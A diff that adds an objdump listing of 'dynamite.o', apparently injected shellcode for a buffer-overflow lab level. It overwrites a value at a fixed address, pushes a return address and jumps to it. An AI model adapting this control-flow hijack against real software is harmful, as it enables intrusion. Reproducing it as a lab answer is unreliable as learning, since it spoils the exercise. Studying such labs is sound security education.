@@ -1,0 +1,11 @@
+
+dynamite.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	c7 05 34 34 68 55 67 	movl   $0x26f00467,0x55683434
+   7:	04 f0 26 
+   a:	ff 35 65 8e 04 08    	pushl  0x8048e65
+  10:	c3                   	ret    
